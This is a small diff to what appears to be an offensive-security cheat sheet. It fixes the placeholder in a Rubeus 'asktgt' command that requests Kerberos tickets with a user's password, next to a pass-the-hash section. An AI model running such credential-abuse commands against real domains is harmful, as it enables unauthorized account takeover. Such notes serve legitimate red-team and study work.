@@ -9,7 +9,7 @@
 /rc4, /aes128, /aes256, /des
 #cat/ATTACK/EXPLOIT  
 ```powershell
-.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<nt_hash> /nowrap
+.\Rubeus.exe asktgt /user:<user> /domain:<domain_fqdn> /password:<password> /nowrap
 ```
 
 ## asktgt - (pth)
